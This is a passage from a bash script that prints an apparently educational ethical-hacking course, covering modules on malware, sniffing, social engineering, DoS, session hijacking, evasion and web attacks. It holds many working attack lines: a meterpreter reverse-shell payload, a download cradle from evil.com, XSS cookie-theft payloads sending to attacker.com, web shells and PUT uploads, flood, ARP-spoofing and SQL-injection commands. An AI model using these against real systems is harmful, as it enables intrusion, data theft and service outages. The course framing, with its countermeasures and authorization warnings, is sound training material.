    echo -e "msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw > payload.php"
    
    echo -e "\n${WHITE}🔒 MAINTAINING ACCESS:${NC}"
    echo -e "• ${CYAN}Backdoors${NC}: Persistent access mechanisms"
    echo -e "• ${CYAN}Rootkits${NC}: Hidden system modifications"
    echo -e "• ${CYAN}Scheduled Tasks${NC}: Automated execution"
    echo -e "• ${CYAN}Registry Modifications${NC}: Windows persistence\n"
    
    echo -e "${YELLOW}Press Enter to mark as complete and continue...${NC}"
    read
    update_progress 6
}

# Module 7: Malware Threats
module_7() {
    show_header
    echo -e "${BLUE}=== MODULE 7: MALWARE THREATS ===${NC}\n"
    
    echo -e "${WHITE}📖 OVERVIEW:${NC}"
    echo -e "Understanding different types of malicious software, their behavior,"
    echo -e "distribution methods, and analysis techniques.\n"
    
    echo -e "${WHITE}🦠 MALWARE TYPES:${NC}"
    echo -e "• ${RED}Virus${NC}: Self-replicating code that attaches to files"
    echo -e "• ${RED}Worm${NC}: Self-propagating malware through networks"
    echo -e "• ${RED}Trojan${NC}: Disguised malicious programs"
    echo -e "• ${RED}Rootkit${NC}: Hidden system-level malware"
    echo -e "• ${RED}Ransomware${NC}: Encrypts data for ransom"
    echo -e "• ${RED}Spyware${NC}: Secretly monitors user activities"
    echo -e "• ${RED}Adware${NC}: Displays unwanted advertisements\n"
    
    echo -e "${WHITE}💻 MALWARE ANALYSIS TOOLS:${NC}"
    echo -e "${GREEN}# VirusTotal command line${NC}"
    echo -e "vt scan file suspicious_file.exe"
    echo -e "\n${GREEN}# File analysis${NC}"
    echo -e "file suspicious_file.exe"
    echo -e "strings suspicious_file.exe | head -20"
    echo -e "hexdump -C suspicious_file.exe | head -10"
    echo -e "\n${GREEN}# PE analysis${NC}"
    echo -e "peframe suspicious_file.exe"
    echo -e "\n${GREEN}# Yara rules${NC}"
    echo -e "yara /usr/share/yara/rules/malware.yar suspicious_file.exe"
    
    echo -e "\n${WHITE}💻 DYNAMIC ANALYSIS:${NC}"
    echo -e "${GREEN}# Process monitoring${NC}"
    echo -e "ps aux | grep suspicious_process"
    echo -e "top -p PID"
    echo -e "\n${GREEN}# Network monitoring${NC}"
    echo -e "netstat -tulpn"
    echo -e "tcpdump -i any -w capture.pcap"
    echo -e "\n${GREEN}# File system monitoring${NC}"
    echo -e "lsof -p PID"
    echo -e "strace -p PID"
    
    echo -e "\n${WHITE}💻 MALWARE CREATION (EDUCATIONAL):${NC}"
    echo -e "${GREEN}# Simple batch virus${NC}"
    echo -e "echo '@echo off' > virus.bat"
    echo -e "echo 'echo Malware detected!' >> virus.bat"
    echo -e "echo 'copy %0 %TEMP%\\virus.bat' >> virus.bat"
    echo -e "\n${GREEN}# PowerShell download cradle${NC}"
    echo -e "powershell -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://evil.com/payload\")'"
    
    echo -e "\n${WHITE}🛡️ DETECTION TECHNIQUES:${NC}"
    echo -e "• ${CYAN}Signature-based${NC}: Known malware patterns"
    echo -e "• ${CYAN}Heuristic${NC}: Behavioral analysis"
    echo -e "• ${CYAN}Sandbox${NC}: Isolated execution environment"
    echo -e "• ${CYAN}Machine Learning${NC}: AI-based detection\n"
    
    echo -e "${WHITE}🔬 ANALYSIS ENVIRONMENTS:${NC}"
    echo -e "• ${CYAN}REMnux${NC}: Malware analysis Linux distribution"
    echo -e "• ${CYAN}FLARE VM${NC}: Windows malware analysis VM"
    echo -e "• ${CYAN}Cuckoo Sandbox${NC}: Automated malware analysis"
    echo -e "• ${CYAN}Any.run${NC}: Online malware sandbox\n"
    
    echo -e "${YELLOW}Press Enter to mark as complete and continue...${NC}"
    read
    update_progress 7
}

# Module 8: Sniffing
module_8() {
    show_header
    echo -e "${BLUE}=== MODULE 8: SNIFFING ===${NC}\n"
    
    echo -e "${WHITE}📖 OVERVIEW:${NC}"
    echo -e "Network sniffing involves capturing and analyzing network traffic to"
    echo -e "extract sensitive information like passwords and data.\n"
    
    echo -e "${WHITE}🎯 SNIFFING TYPES:${NC}"
    echo -e "• ${GREEN}Passive${NC}: Monitoring without altering traffic"
    echo -e "• ${GREEN}Active${NC}: Injecting packets to capture responses"
    echo -e "• ${GREEN}Switch-based${NC}: Attacks on switched networks"
    echo -e "• ${GREEN}Router-based${NC}: Attacks on routed networks\n"
    
    echo -e "${WHITE}💻 WIRESHARK ANALYSIS:${NC}"
    echo -e "${GREEN}# Start Wireshark${NC}"
    echo -e "wireshark"
    echo -e "\n${GREEN}# Command line capture${NC}"
    echo -e "tshark -i eth0 -f 'port 80' -w http_traffic.pcap"
    echo -e "\n${GREEN}# Analyze captured file${NC}"
    echo -e "tshark -r capture.pcap -Y http.request"
    echo -e "\n${GREEN}# Extract HTTP objects${NC}"
    echo -e "tshark -r capture.pcap --export-objects http,extracted_files/"
    
    echo -e "\n${WHITE}💻 TCPDUMP COMMANDS:${NC}"
    echo -e "${GREEN}# Basic capture${NC}"
    echo -e "tcpdump -i eth0 -w capture.pcap"
    echo -e "\n${GREEN}# Filter by protocol${NC}"
    echo -e "tcpdump -i eth0 icmp"
    echo -e "tcpdump -i eth0 'port 22'"
    echo -e "\n${GREEN}# Capture passwords${NC}"
    echo -e "tcpdump -i eth0 -A -s 0 'tcp port 21 or tcp port 23'"
    echo -e "\n${GREEN}# Monitor DNS queries${NC}"
    echo -e "tcpdump -i eth0 'udp port 53'"
    
    echo -e "\n${WHITE}💻 ARP POISONING:${NC}"
    echo -e "${GREEN}# Ettercap ARP spoofing${NC}"
    echo -e "ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//"
    echo -e "\n${GREEN}# Arpspoof${NC}"
    echo -e "arpspoof -i eth0 -t 192.168.1.100 192.168.1.1"
    echo -e "\n${GREEN}# Bettercap${NC}"
    echo -e "bettercap -iface eth0"
    echo -e "net.probe on"
    echo -e "set arp.spoof.fullduplex true"
    echo -e "arp.spoof on"
    
    echo -e "\n${WHITE}💻 MAC FLOODING:${NC}"
    echo -e "${GREEN}# Macof${NC}"
    echo -e "macof -i eth0 -n 1000"
    echo -e "\n${GREEN}# Yersinia${NC}"
    echo -e "yersinia -G"
    
    echo -e "\n${WHITE}💻 DHCP ATTACKS:${NC}"
    echo -e "${GREEN}# DHCP starvation${NC}"
    echo -e "yersinia -I -attack 1"
    echo -e "\n${GREEN}# Rogue DHCP server${NC}"
    echo -e "dhcpd -cf /etc/dhcp/dhcpd.conf eth0"
    
    echo -e "\n${WHITE}🔒 SNIFFING COUNTERMEASURES:${NC}"
    echo -e "• Use encrypted protocols (HTTPS, SSH, SFTP)"
    echo -e "• Implement port security on switches"
    echo -e "• Use VPNs for sensitive communications"
    echo -e "• Monitor for ARP spoofing attacks\n"
    
    echo -e "${YELLOW}Press Enter to mark as complete and continue...${NC}"
    read
    update_progress 8
}

# Module 9: Social Engineering
module_9() {
    show_header
    echo -e "${BLUE}=== MODULE 9: SOCIAL ENGINEERING ===${NC}\n"
    
    echo -e "${WHITE}📖 OVERVIEW:${NC}"
    echo -e "Social engineering exploits human psychology to manipulate people into"
    echo -e "divulging confidential information or performing actions that compromise security.\n"
    
    echo -e "${WHITE}🎭 ATTACK TYPES:${NC}"
    echo -e "• ${RED}Phishing${NC}: Fraudulent emails/websites"
    echo -e "• ${RED}Pretexting${NC}: Creating false scenarios"
    echo -e "• ${RED}Baiting${NC}: Offering something enticing"
    echo -e "• ${RED}Quid Pro Quo${NC}: Offering services for information"
    echo -e "• ${RED}Tailgating${NC}: Following authorized personnel"
    echo -e "• ${RED}Dumpster Diving${NC}: Searching through trash\n"
    
    echo -e "${WHITE}💻 INFORMATION GATHERING:${NC}"
    echo -e "${GREEN}# Social media reconnaissance${NC}"
    echo -e "sherlock target_username"
    echo -e "\n${GREEN}# Company information${NC}"
    echo -e "theHarvester -d target-company.com -l 100 -b linkedin"
    echo -e "\n${GREEN}# Employee enumeration${NC}"
    echo -e "linkedin2username -c target-company"
    echo -e "\n${GREEN}# Phone number lookup${NC}"
    echo -e "phoneinfoga scan -n +1234567890"
    
    echo -e "\n${WHITE}💻 PHISHING CAMPAIGNS:${NC}"
    echo -e "${GREEN}# Social Engineering Toolkit${NC}"
    echo -e "setoolkit"
    echo -e "# Select: 1) Social-Engineering Attacks"
    echo -e "# Select: 2) Website Attack Vectors"
    echo -e "# Select: 3) Credential Harvester Attack Method"
    echo -e "\n${GREEN}# King Phisher${NC}"
    echo -e "king-phisher-server"
    echo -e "king-phisher-client"
    echo -e "\n${GREEN}# Gophish${NC}"
    echo -e "gophish"
    
    echo -e "\n${WHITE}💻 EMAIL SPOOFING:${NC}"
    echo -e "${GREEN}# Swaks email testing${NC}"
    echo -e "swaks --to victim@target.com --from ceo@target.com --server mail.target.com"
    echo -e "\n${GREEN}# Sendemail${NC}"
    echo -e "sendemail -f admin@bank.com -t victim@email.com -u 'Account Verification' -m 'Click link to verify'"
    
    echo -e "\n${WHITE}💻 PHYSICAL SECURITY:${NC}"
    echo -e "${GREEN}# Lock picking practice${NC}"
    echo -e "# Practice on your own locks only!"
    echo -e "\n${GREEN}# Badge cloning${NC}"
    echo -e "proxmark3"
    echo -e "# Educational purposes only"
    echo -e "\n${GREEN}# USB drops${NC}"
    echo -e "# Create USB payloads for awareness training"
    echo -e "# Never deploy without authorization"
    
    echo -e "\n${WHITE}🛡️ DEFENSE STRATEGIES:${NC}"
    echo -e "• Security awareness training"
    echo -e "• Email filtering and verification"
    echo -e "• Multi-factor authentication"
    echo -e "• Verification procedures for sensitive requests"
    echo -e "• Regular security policy updates\n"
    
    echo -e "${WHITE}⚖️ ETHICAL CONSIDERATIONS:${NC}"
    echo -e "• Always obtain written authorization"
    echo -e "• Respect privacy and personal boundaries"
    echo -e "• Focus on improving security awareness"
    echo -e "• Document for legitimate security testing only\n"
    
    echo -e "${YELLOW}Press Enter to mark as complete and continue...${NC}"
    read
    update_progress 9
}

# Module 10: Denial-of-Service
module_10() {
    show_header
    echo -e "${BLUE}=== MODULE 10: DENIAL-OF-SERVICE ===${NC}\n"
    
    echo -e "${WHITE}📖 OVERVIEW:${NC}"
    echo -e "DoS attacks aim to make systems or networks unavailable to legitimate users"
    echo -e "by overwhelming resources or exploiting vulnerabilities.\n"
    
    echo -e "${WHITE}🎯 ATTACK TYPES:${NC}"
    echo -e "• ${RED}Volumetric${NC}: Bandwidth exhaustion"
    echo -e "• ${RED}Protocol${NC}: Exploiting protocol weaknesses"
    echo -e "• ${RED}Application Layer${NC}: Targeting application resources"
    echo -e "• ${RED}Distributed (DDoS)${NC}: Multiple sources attack\n"
    
    echo -e "${WHITE}💻 NETWORK LAYER ATTACKS:${NC}"
    echo -e "${GREEN}# Hping3 SYN flood${NC}"
    echo -e "hping3 -S --flood -p 80 192.168.1.100"
    echo -e "\n${GREEN}# Ping flood${NC}"
    echo -e "hping3 -1 --flood 192.168.1.100"
    echo -e "\n${GREEN}# UDP flood${NC}"
    echo -e "hping3 -2 --flood -p 53 192.168.1.100"
    echo -e "\n${GREEN}# Nmap SYN flood${NC}"
    echo -e "nmap -sS --script dos 192.168.1.100"
    
    echo -e "\n${WHITE}💻 APPLICATION LAYER ATTACKS:${NC}"
    echo -e "${GREEN}# Slowloris${NC}"
    echo -e "slowloris -dns 192.168.1.100 -port 80 -timeout 50 -num 500"
    echo -e "\n${GREEN}# HTTP flood with curl${NC}"
    echo -e "for i in {1..1000}; do curl http://192.168.1.100 & done"
    echo -e "\n${GREEN}# Apache Bench${NC}"
    echo -e "ab -n 10000 -c 100 http://192.168.1.100/"
    echo -e "\n${GREEN}# Siege${NC}"
    echo -e "siege -c 100 -t 60s http://192.168.1.100"
    
    echo -e "\n${WHITE}💻 AMPLIFICATION ATTACKS:${NC}"
    echo -e "${GREEN}# DNS amplification${NC}"
    echo -e "hping3 -2 -p 53 --spoof 192.168.1.100 8.8.8.8"
    echo -e "\n${GREEN}# NTP amplification${NC}"
    echo -e "ntpdc -n -c monlist 192.168.1.100"
    echo -e "\n${GREEN}# SNMP amplification${NC}"
    echo -e "onesixtyone -c public 192.168.1.100"
    
    echo -e "\n${WHITE}💻 WIRELESS DOS:${NC}"
    echo -e "${GREEN}# Deauth attack${NC}"
    echo -e "aireplay-ng -0 0 -a [BSSID] wlan0mon"
    echo -e "\n${GREEN}# Beacon flood${NC}"
    echo -e "mdk3 wlan0mon b -f /usr/share/wordlists/wlan-names.txt"
    echo -e "\n${GREEN}# Channel hopping${NC}"
    echo -e "airodump-ng --channel 1-11 wlan0mon"
    
    echo -e "\n${WHITE}🛠️ DOS TESTING TOOLS:${NC}"
    echo -e "• ${CYAN}LOIC${NC}: Low Orbit Ion Cannon"
    echo -e "• ${CYAN}HOIC${NC}: High Orbit Ion Cannon"
    echo -e "• ${CYAN}Slowloris${NC}: Application layer DoS"
    echo -e "• ${CYAN}GoldenEye${NC}: HTTP DoS tool"
    echo -e "• ${CYAN}Hulk${NC}: Web server DoS\n"
    
    echo -e "${WHITE}🛡️ MITIGATION TECHNIQUES:${NC}"
    echo -e "• Rate limiting and traffic shaping"
    echo -e "• DDoS protection services (Cloudflare, Akamai)"
    echo -e "• Intrusion Detection Systems (IDS)"
    echo -e "• Network monitoring and anomaly detection"
    echo -e "• Redundancy and load balancing\n"
    
    echo -e "${RED}⚠️ WARNING: Use only in authorized testing environments!${NC}\n"
    
    echo -e "${YELLOW}Press Enter to mark as complete and continue...${NC}"
    read
    update_progress 10
}

# Module 11: Session Hijacking
module_11() {
    show_header
    echo -e "${BLUE}=== MODULE 11: SESSION HIJACKING ===${NC}\n"
    
    echo -e "${WHITE}📖 OVERVIEW:${NC}"
    echo -e "Session hijacking involves taking over a user's session by stealing or"
    echo -e "predicting session tokens to gain unauthorized access to applications.\n"
    
    echo -e "${WHITE}🎯 ATTACK TYPES:${NC}"
    echo -e "• ${RED}Session Prediction${NC}: Guessing session IDs"
    echo -e "• ${RED}Session Sniffing${NC}: Capturing session tokens"
    echo -e "• ${RED}Cross-Site Scripting${NC}: Stealing cookies via XSS"
    echo -e "• ${RED}Man-in-the-Middle${NC}: Intercepting sessions"
    echo -e "• ${RED}Session Fixation${NC}: Forcing known session ID\n"
    
    echo -e "${WHITE}💻 SESSION ANALYSIS:${NC}"
    echo -e "${GREEN}# Capture HTTP sessions${NC}"
    echo -e "tcpdump -i eth0 -A -s 0 'tcp port 80 and host target.com'"
    echo -e "\n${GREEN}# Extract cookies from pcap${NC}"
    echo -e "tshark -r capture.pcap -Y http.cookie -T fields -e http.cookie"
    echo -e "\n${GREEN}# Burp Suite session analysis${NC}"
    echo -e "burpsuite"
    echo -e "# Proxy > HTTP history > Analyze session tokens"
    echo -e "\n${GREEN}# OWASP ZAP session management${NC}"
    echo -e "zaproxy"
    echo -e "# Tools > Options > Session Management"
    
    echo -e "\n${WHITE}💻 COOKIE MANIPULATION:${NC}"
    echo -e "${GREEN}# View cookies with curl${NC}"
    echo -e "curl -c cookies.txt -b cookies.txt http://target.com/login"
    echo -e "\n${GREEN}# Manual cookie editing${NC}"
    echo -e "curl -H 'Cookie: PHPSESSID=modified_session_id' http://target.com"
    echo -e "\n${GREEN}# Session ID analysis${NC}"
    echo -e "for i in {1..100}; do curl -s http://target.com/login | grep -o 'PHPSESSID=[^;]*'; done"
    
    echo -e "\n${WHITE}💻 XSS FOR SESSION THEFT:${NC}"
    echo -e "${GREEN}# Basic XSS payload${NC}"
    echo -e "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>"
    echo -e "\n${GREEN}# Advanced XSS payload${NC}"
    echo -e "<script>new Image().src='http://attacker.com/log.php?c='+encodeURIComponent(document.cookie)</script>"
    echo -e "\n${GREEN}# BeEF hook${NC}"
    echo -e "beef-xss"
    echo -e "<script src='http://attacker-ip:3000/hook.js'></script>"
    
    echo -e "\n${WHITE}💻 SESSION TOOLS:${NC}"
    echo -e "${GREEN}# Ferret and Hamster${NC}"
    echo -e "ferret -i eth0 -W hamster.txt"
    echo -e "hamster"
    echo -e "\n${GREEN}# Firesheep (WiFi session hijacking)${NC}"
    echo -e "# Educational tool for demonstrating WiFi session vulnerabilities"
    echo -e "\n${GREEN}# Custom session hijacking script${NC}"
    echo -e "python3 session_hijack.py --target 192.168.1.100 --interface eth0"
    
    echo -e "\n${WHITE}🛡️ COUNTERMEASURES:${NC}"
    echo -e "• Use HTTPS for all authenticated sessions"
    echo -e "• Implement secure session management"
    echo -e "• Use HttpOnly and Secure cookie flags"
    echo -e "• Implement session timeout and regeneration"
    echo -e "• Monitor for suspicious session activities\n"
    
    echo -e "${YELLOW}Press Enter to mark as complete and continue...${NC}"
    read
    update_progress 11
}

# Module 12: Evading IDS, Firewalls, and Honeypots
module_12() {
    show_header
    echo -e "${BLUE}=== MODULE 12: EVADING IDS, FIREWALLS, AND HONEYPOTS ===${NC}\n"
    
    echo -e "${WHITE}📖 OVERVIEW:${NC}"
    echo -e "Learning techniques to bypass security controls including Intrusion Detection"
    echo -e "Systems, firewalls, and honeypots while maintaining stealth.\n"
    
    echo -e "${WHITE}🛡️ SECURITY CONTROLS:${NC}"
    echo -e "• ${BLUE}IDS${NC}: Intrusion Detection System"
    echo -e "• ${BLUE}IPS${NC}: Intrusion Prevention System"
    echo -e "• ${BLUE}Firewall${NC}: Network traffic filtering"
    echo -e "• ${BLUE}Honeypot${NC}: Decoy systems to detect attacks"
    echo -e "• ${BLUE}WAF${NC}: Web Application Firewall\n"
    
    echo -e "${WHITE}💻 NMAP EVASION TECHNIQUES:${NC}"
    echo -e "${GREEN}# Slow scan to avoid detection${NC}"
    echo -e "nmap -sS -T1 -f target.com"
    echo -e "\n${GREEN}# Fragment packets${NC}"
    echo -e "nmap -f --mtu 8 target.com"
    echo -e "\n${GREEN}# Decoy scans${NC}"
    echo -e "nmap -D RND:10 target.com"
    echo -e "\n${GREEN}# Source port spoofing${NC}"
    echo -e "nmap --source-port 53 target.com"
    echo -e "\n${GREEN}# Idle zombie scan${NC}"
    echo -e "nmap -sI zombie_ip target.com"
    echo -e "\n${GREEN}# Randomize targets and ports${NC}"
    echo -e "nmap --randomize-hosts --top-ports 1000 target_range"
    
    echo -e "\n${WHITE}💻 FIREWALL BYPASS:${NC}"
    echo -e "${GREEN}# ACK scan for stateless firewalls${NC}"
    echo -e "nmap -sA target.com"
    echo -e "\n${GREEN}# HTTP tunneling${NC}"
    echo -e "httptunnel -s target.com:8080"
    echo -e "\n${GREEN}# DNS tunneling${NC}"
    echo -e "dnscat2-server attack.com"
    echo -e "dnscat2 attack.com"
    echo -e "\n${GREEN}# SSH tunneling${NC}"
    echo -e "ssh -L 8080:internal.target.com:80 user@jump.target.com"
    
    echo -e "\n${WHITE}💻 IDS EVASION:${NC}"
    echo -e "${GREEN}# String obfuscation${NC}"
    echo -e "echo 'cat /etc/passwd' | base64"
    echo -e "echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | bash"
    echo -e "\n${GREEN}# Unicode encoding${NC}"
    echo -e "curl 'http://target.com/script.php?cmd=\\u0063\\u0061\\u0074\\u0020\\u002f\\u0065\\u0074\\u0063\\u002f\\u0070\\u0061\\u0073\\u0073\\u0077\\u0064'"
    echo -e "\n${GREEN}# Case variation${NC}"
    echo -e "sElEcT * fRoM uSeRs WhErE iD=1"
    echo -e "\n${GREEN}# Time-based evasion${NC}"
    echo -e "sleep 300 && nmap target.com"
    
    echo -e "\n${WHITE}💻 HONEYPOT DETECTION:${NC}"
    echo -e "${GREEN}# Check for honeypot indicators${NC}"
    echo -e "nmap -O --osscan-guess target.com"
    echo -e "\n${GREEN}# Honeypot detection tools${NC}"
    echo -e "python3 honeypot_detector.py target.com"
    echo -e "\n${GREEN}# Timing analysis${NC}"
    echo -e "hping3 -S -p 80 -c 100 target.com"
    echo -e "\n${GREEN}# Service fingerprinting${NC}"
    echo -e "nc -nv target.com 22"
    
    echo -e "\n${WHITE}💻 WAF BYPASS:${NC}"
    echo -e "${GREEN}# SQL injection WAF bypass${NC}"
    echo -e "1' UNION SELECT NULL,user(),version()-- -"
    echo -e "1' UNION/*!50000SELECT*/NULL,user(),version()-- -"
    echo -e "\n${GREEN}# XSS WAF bypass${NC}"
    echo -e "<script>alert(String.fromCharCode(88,83,83))</script>"
    echo -e "\n${GREEN}# WAFNinja${NC}"
    echo -e "python3 wafninja.py bypass -u 'http://target.com/page.php?id=1'"
    echo -e "\n${GREEN}# PayloadsAllTheThings${NC}"
    echo -e "# Use various bypass techniques from the repository"
    
    echo -e "\n${WHITE}🔧 EVASION TOOLS:${NC}"
    echo -e "• ${CYAN}Veil${NC}: Payload generator and AV evasion"
    echo -e "• ${CYAN}Shellter${NC}: Dynamic shellcode injection"
    echo -e "• ${CYAN}TheFatRat${NC}: Backdoor and payload generator"
    echo -e "• ${CYAN}Unicorn${NC}: PowerShell attack vector"
    echo -e "• ${CYAN}Empire${NC}: PowerShell post-exploitation agent\n"
    
    echo -e "${YELLOW}Press Enter to mark as complete and continue...${NC}"
    read
    update_progress 12
}

# Module 13: Hacking Web Servers
module_13() {
    show_header
    echo -e "${BLUE}=== MODULE 13: HACKING WEB SERVERS ===${NC}\n"
    
    echo -e "${WHITE}📖 OVERVIEW:${NC}"
    echo -e "Web server hacking involves identifying vulnerabilities in web servers"
    echo -e "and exploiting misconfigurations, default settings, and known exploits.\n"
    
    echo -e "${WHITE}🌐 COMMON WEB SERVERS:${NC}"
    echo -e "• ${GREEN}Apache HTTP Server${NC}: Most popular web server"
    echo -e "• ${GREEN}Nginx${NC}: High-performance web server"
    echo -e "• ${GREEN}Microsoft IIS${NC}: Windows web server"
    echo -e "• ${GREEN}LiteSpeed${NC}: Commercial web server"
    echo -e "• ${GREEN}Tomcat${NC}: Java servlet container\n"
    
    echo -e "${WHITE}💻 WEB SERVER RECONNAISSANCE:${NC}"
    echo -e "${GREEN}# Banner grabbing${NC}"
    echo -e "nc target.com 80"
    echo -e "HEAD / HTTP/1.0"
    echo -e "\n${GREEN}# HTTP headers analysis${NC}"
    echo -e "curl -I http://target.com"
    echo -e "wget --server-response --spider http://target.com"
    echo -e "\n${GREEN}# Web technology detection${NC}"
    echo -e "whatweb target.com"
    echo -e "wappalyzer target.com"
    echo -e "\n${GREEN}# Directory enumeration${NC}"
    echo -e "gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
    echo -e "dirb http://target.com"
    
    echo -e "\n${WHITE}💻 VULNERABILITY SCANNING:${NC}"
    echo -e "${GREEN}# Nikto web scanner${NC}"
    echo -e "nikto -h http://target.com"
    echo -e "\n${GREEN}# Uniscan${NC}"
    echo -e "uniscan -u http://target.com -qweds"
    echo -e "\n${GREEN}# Nuclei scanner${NC}"
    echo -e "nuclei -u http://target.com"
    echo -e "\n${GREEN}# Custom NSE scripts${NC}"
    echo -e "nmap --script http-vuln* target.com"
    
    echo -e "\n${WHITE}💻 COMMON ATTACKS:${NC}"
    echo -e "${GREEN}# Default credentials${NC}"
    echo -e "admin:admin, admin:password, root:root"
    echo -e "\n${GREEN}# Directory traversal${NC}"
    echo -e "curl 'http://target.com/../../../etc/passwd'"
    echo -e "curl 'http://target.com/..\\..\\..\\windows\\system32\\drivers\\etc\\hosts'"
    echo -e "\n${GREEN}# File inclusion${NC}"
    echo -e "curl 'http://target.com/page.php?file=../../../../etc/passwd'"
    echo -e "curl 'http://target.com/page.php?file=http://attacker.com/shell.txt'"
    echo -e "\n${GREEN}# HTTP verb tampering${NC}"
    echo -e "curl -X DELETE http://target.com/admin/users/1"
    echo -e "curl -X PUT http://target.com/upload/shell.php"
    
    echo -e "\n${WHITE}💻 APACHE-SPECIFIC ATTACKS:${NC}"
    echo -e "${GREEN}# .htaccess bypass${NC}"
    echo -e "curl 'http://target.com/.htaccess'"
    echo -e "curl 'http://target.com/admin/.htpasswd'"
    echo -e "\n${GREEN}# Apache Struts${NC}"
    echo -e "# Search for Struts RCE exploits"
    echo -e "searchsploit apache struts"
    echo -e "\n${GREEN}# Server-status information${NC}"
    echo -e "curl 'http://target.com/server-status'"
    echo -e "curl 'http://target.com/server-info'"
    
    echo -e "\n${WHITE}💻 IIS-SPECIFIC ATTACKS:${NC}"
    echo -e "${GREEN}# IIS shortname enumeration${NC}"
    echo -e "java -jar iis_shortname_scanner.jar 2 20 http://target.com/"
    echo -e "\n${GREEN}# WebDAV enumeration${NC}"
    echo -e "davtest -url http://target.com"
    echo -e "cadaver http://target.com"
    echo -e "\n${GREEN}# ASP.NET ViewState${NC}"
    echo -e "# Analyze ViewState for sensitive data"
    echo -e "python3 viewstate_decoder.py [base64_viewstate]"
    
    echo -e "\n${WHITE}💻 WEB SHELL UPLOAD:${NC}"
    echo -e "${GREEN}# PHP web shell${NC}"
    echo -e "echo '<?php system(\$_GET[\"cmd\"]); ?>' > shell.php"
    echo -e "\n${GREEN}# JSP web shell${NC}"
    echo -e "echo '<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>' > shell.jsp"
    echo -e "\n${GREEN}# ASP web shell${NC}"
    echo -e "echo '<%eval request(\"cmd\")%>' > shell.asp"
    echo -e "\n${GREEN}# Upload via PUT method${NC}"
    echo -e "curl -X PUT http://target.com/shell.php -d '<?php system(\$_GET[\"cmd\"]); ?>'"
    
    echo -e "\n${WHITE}🛡️ HARDENING RECOMMENDATIONS:${NC}"
    echo -e "• Remove default accounts and pages"
    echo -e "• Disable unnecessary HTTP methods"
    echo -e "• Implement proper access controls"
    echo -e "• Keep web server software updated"
    echo -e "• Configure secure headers (HSTS, CSP, etc.)\n"
    
    echo -e "${YELLOW}Press Enter to mark as complete and continue...${NC}"
    read
    update_progress 13
}

# Module 14: Hacking Web Applications
module_14() {
    show_header
    echo -e "${BLUE}=== MODULE 14: HACKING WEB APPLICATIONS ===${NC}\n"
    
    echo -e "${WHITE}📖 OVERVIEW:${NC}"
    echo -e "Web application hacking focuses on exploiting vulnerabilities in web-based"
    echo -e "applications through various attack vectors and security flaws.\n"
    
    echo -e "${WHITE}🎯 OWASP TOP 10:${NC}"
    echo -e "• ${RED}A01${NC}: Broken Access Control"
    echo -e "• ${RED}A02${NC}: Cryptographic Failures"
    echo -e "• ${RED}A03${NC}: Injection"
    echo -e "• ${RED}A04${NC}: Insecure Design"
    echo -e "• ${RED}A05${NC}: Security Misconfiguration"
    echo -e "• ${RED}A06${NC}: Vulnerable Components"
    echo -e "• ${RED}A07${NC}: Authentication Failures"
    echo -e "• ${RED}A08${NC}: Software Integrity Failures"
    echo -e "• ${RED}A09${NC}: Logging Failures"
    echo -e "• ${RED}A10${NC}: Server-Side Request Forgery\n"
    
    echo -e "${WHITE}💻 RECONNAISSANCE:${NC}"
    echo -e "${GREEN}# Technology stack identification${NC}"
    echo -e "whatweb http://target.com"
    echo -e "wappalyzer http://target.com"
    echo -e "\n${GREEN}# Source code analysis${NC}"
    echo -e "curl -s http://target.com | grep -i 'password\\|admin\\|debug'"
    echo -e "\n${GREEN}# Robots.txt and sitemap${NC}"
    echo -e "curl http://target.com/robots.txt"
    echo -e "curl http://target.com/sitemap.xml"
    echo -e "\n${GREEN}# Directory/file discovery${NC}"
    echo -e "gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/big.txt"
    echo -e "ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://target.com/FUZZ"
    
    echo -e "\n${WHITE}💻 INJECTION ATTACKS:${NC}"
    echo -e "${GREEN}# XSS (Cross-Site Scripting)${NC}"
    echo -e "<script>alert('XSS')</script>"
    echo -e "<img src=x onerror=alert('XSS')>"
    echo -e "javascript:alert('XSS')"
    echo -e "\n${GREEN}# Command Injection${NC}"
    echo -e "; cat /etc/passwd"
    echo -e "| whoami"
    echo -e "&& id"
    echo -e "\n${GREEN}# LDAP Injection${NC}"
    echo -e "admin)(&(password=*"
    echo -e "*)(uid=*))(|(uid=*"
    echo -e "\n${GREEN}# XML Injection${NC}"
    echo -e "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"
    
    echo -e "\n${WHITE}💻 AUTHENTICATION BYPASS:${NC}"
    echo -e "${GREEN}# SQL-based authentication bypass${NC}"
    echo -e "' OR '1'='1"
    echo -e "admin'--"
    echo -e "' OR 1=1#"
    echo -e "\n${GREEN}# Session fixation${NC}"
    echo -e "# Force a known session ID"
    echo -e "curl -b 'PHPSESSID=fixated_session_id' http://target.com/login"
    echo -e "\n${GREEN}# Password reset vulnerabilities${NC}"
    echo -e "# Test for user enumeration, weak tokens, etc."
    echo -e "curl -X POST -d 'email=admin@target.com' http://target.com/reset"
    
    echo -e "\n${WHITE}💻 FILE UPLOAD ATTACKS:${NC}"
    echo -e "${GREEN}# PHP shell upload${NC}"
    echo -e "echo '<?php system(\$_GET[\"cmd\"]); ?>' > shell.php.jpg"
    echo -e "\n${GREEN}# Double extension${NC}"
    echo -e "shell.php.jpg"
    echo -e "\n${GREEN}# Null byte injection${NC}"
    echo -e "shell.php%00.jpg"
    echo -e "\n${GREEN}# MIME type bypass${NC}"
    echo -e "# Change Content-Type to image/jpeg"
    
    echo -e "\n${WHITE}💻 BURP SUITE WORKFLOW:${NC}"
    echo -e "${GREEN}# Start Burp Suite${NC}"
    echo -e "burpsuite"
    echo -e "\n${GREEN}# Configure browser proxy${NC}"
    echo -e "# Set proxy to 127.0.0.1:8080"
    echo -e "\n${GREEN}# Key features to use:${NC}"
    echo -e "# - Proxy: Intercept and modify requests"
    echo -e "# - Spider: Automatic crawling"
    echo -e "# - Repeater: Manual request testing"
    echo -e "# - Intruder: Automated attacks"
    echo -e "# - Scanner: Vulnerability scanning (Pro only)"
    
    echo -e "\n${WHITE}💻 OWASP ZAP WORKFLOW:${NC}"
